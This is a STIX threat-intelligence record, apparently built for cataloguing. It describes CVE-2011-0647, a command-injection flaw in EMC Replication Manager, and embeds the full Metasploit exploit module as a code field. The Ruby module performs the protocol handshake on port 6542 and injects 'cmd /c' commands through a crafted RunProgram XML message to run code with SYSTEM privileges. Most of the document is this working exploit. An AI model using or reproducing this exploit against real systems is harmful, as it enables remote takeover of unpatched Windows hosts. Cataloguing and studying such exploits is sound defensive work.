{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--df49182a-08a8-4cfe-b2d7-06c0d08c816d",
    "created": "2024-08-14T16:48:06.695341Z",
    "modified": "2024-08-14T16:48:06.695345Z",
    "name": "EMC Replication Manager Command Execution",
    "description": " This module exploits a remote command-injection vulnerability in EMC Replication Manager client (irccd.exe). By sending a specially crafted message invoking RunProgram function an attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected products are EMC Replication Manager < 5.3. This module has been successfully tested against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested against these products. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/emc/replication_manager_exec.rb",
            "external_id": "replication_manager_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0647"
        },
        {
            "source_name": "reference",
            "url": "http://www.securityfocus.com/archive/1/516260"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EMC Replication Manager Command Execution',\n      'Description'    => %q{\n        This module exploits a remote command-injection vulnerability in EMC Replication Manager\n        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an\n        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected\n        products are EMC Replication Manager < 5.3. This module has been successfully tested\n        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft\n        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested\n        against these products.\n      },\n      'Author'         =>\n        [\n          'Unknown', #Initial discovery\n          'Davy Douhine' #MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-0647' ],\n          [ 'OSVDB', '70853' ],\n          [ 'BID', '46235' ],\n          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],\n          [ 'ZDI', '11-061' ]\n        ],\n      'DisclosureDate' => '2011-02-07',\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'Space'       => 4096,\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          # Tested on Windows XP and Windows 2003\n          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 5\n        },\n      'DefaultTarget'  => 0,\n      'Privileged'     => true\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(6542)\n      ])\n  end\n\n  def exploit\n    execute_cmdstager({:linemax => 5000})\n  end\n\n  def execute_command(cmd, opts)\n    connect\n    hello = \"1HELLOEMC00000000000000000000000\"\n    vprint_status(\"Sending hello...\")\n    sock.put(hello)\n    result = sock.get_once || ''\n    if result =~ /RAWHELLO/\n      vprint_good(\"Expected hello response\")\n    else\n      disconnect\n      fail_with(Failure::Unknown, \"Failed to hello the server\")\n    end\n\n    start_session = \"EMC_Len0000000136<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><ir_message ir_sessionId=0000 ir_type=\\\"ClientStartSession\\\" <ir_version>1</ir_version></ir_message>\"\n    vprint_status(\"Starting session...\")\n    sock.put(start_session)\n    result = sock.get_once || ''\n    if result =~ /EMC/\n      vprint_good(\"A session has been created. Good.\")\n    else\n      disconnect\n      fail_with(Failure::Unknown, \"Failed to create the session\")\n    end\n\n    run_prog = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?> \"\n    run_prog << \"<ir_message ir_sessionId=\\\"01111\\\" ir_requestId=\\\"00000\\\" ir_type=\\\"RunProgram\\\" ir_status=\\\"0\\\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>\"\n    run_prog << \"<ir_runProgramAppInfo>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;ir_message ir_sessionId=&quot;00000&quot; ir_requestId=&quot;00000&quot; \"\n    run_prog << \"ir_type=&quot;App Info&quot; ir_status=&quot;0&quot;&gt;&lt;IR_groupEntry IR_groupType=&quot;anywriter&quot;  IR_groupName=&quot;CM1109A1&quot;  IR_groupId=&quot;1&quot; \"\n    run_prog << \"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?\t&amp;gt; &amp;lt;ir_message ir_sessionId=&amp;quot;00000&amp;quot; \"\n    run_prog << \"ir_requestId=&amp;quot;00000&amp;quot;ir_type=&amp;quot;App Info&amp;quot; ir_status=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;aa_anywriter_ccr_node&amp;gt;CM1109A1\"\n    run_prog << \"&amp;lt;/aa_anywriter_ccr_node&amp;gt;&amp;lt;aa_anywriter_fail_1018&amp;gt;0&amp;lt;/aa_anywriter_fail_1018&amp;gt;&amp;lt;aa_anywriter_fail_1019&amp;gt;0\"\n    run_prog << \"&amp;lt;/aa_anywriter_fail_1019&amp;gt;&amp;lt;aa_anywriter_fail_1022&amp;gt;0&amp;lt;/aa_anywriter_fail_1022&amp;gt;&amp;lt;aa_anywriter_runeseutil&amp;gt;1\"\n    run_prog << \"&amp;lt;/aa_anywriter_runeseutil&amp;gt;&amp;lt;aa_anywriter_ccr_role&amp;gt;2&amp;lt;/aa_anywriter_ccr_role&amp;gt;&amp;lt;aa_anywriter_prescript&amp;gt;\"\n    run_prog << \"&amp;lt;/aa_anywriter_prescript&amp;gt;&amp;lt;aa_anywriter_postscript&amp;gt;&amp;lt;/aa_anywriter_postscript&amp;gt;&amp;lt;aa_anywriter_backuptype&amp;gt;1\"\n    run_prog << \"&amp;lt;/aa_anywriter_backuptype&amp;gt;&amp;lt;aa_anywriter_fail_447&amp;gt;0&amp;lt;/aa_anywriter_fail_447&amp;gt;&amp;lt;aa_anywriter_fail_448&amp;gt;0\"\n    run_prog << \"&amp;lt;/aa_anywriter_fail_448&amp;gt;&amp;lt;aa_exchange_ignore_all&amp;gt;0&amp;lt;/aa_exchange_ignore_all&amp;gt;&amp;lt;aa_anywriter_sthread_eseutil&amp;gt;0&amp\"\n    run_prog << \";lt;/aa_anywriter_sthread_eseutil&amp;gt;&amp;lt;aa_anywriter_required_logs&amp;gt;0&amp;lt;/aa_anywriter_required_logs&amp;gt;&amp;lt;aa_anywriter_required_logs_path\"\n    run_prog << \"&amp;gt;&amp;lt;/aa_anywriter_required_logs_path&amp;gt;&amp;lt;aa_anywriter_throttle&amp;gt;1&amp;lt;/aa_anywriter_throttle&amp;gt;&amp;lt;aa_anywriter_throttle_ios&amp;gt;300\"\n    run_prog << \"&amp;lt;/aa_anywriter_throttle_ios&amp;gt;&amp;lt;aa_anywriter_throttle_dur&amp;gt;1000&amp;lt;/aa_anywriter_throttle_dur&amp;gt;&amp;lt;aa_backup_username&amp;gt;\"\n    run_prog << \"&amp;lt;/aa_backup_username&amp;gt;&amp;lt;aa_backup_password&amp;gt;&amp;lt;/aa_backup_password&amp;gt;&amp;lt;aa_exchange_checksince&amp;gt;1335208339\"\n    run_prog << \"&amp;lt;/aa_exchange_checksince&amp;gt; &amp;lt;/ir_message&amp;gt;&lt;/IR_groupEntry&gt; &lt;/ir_message&gt;</ir_runProgramAppInfo>\"\n    run_prog << \"<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>\"\n    run_prog_header = \"EMC_Len000000\"\n    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog\n\n    vprint_status(\"Executing command....\")\n    sock.put(run_prog_packet)\n    sock.get_once(-1, 1)\n\n    end_string = Rex::Text.rand_text_alpha(rand(10)+32)\n    sock.put(end_string)\n    sock.get_once(-1, 1)\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-07",
    "x_mitre_platforms": [
        "win'"
    ]
}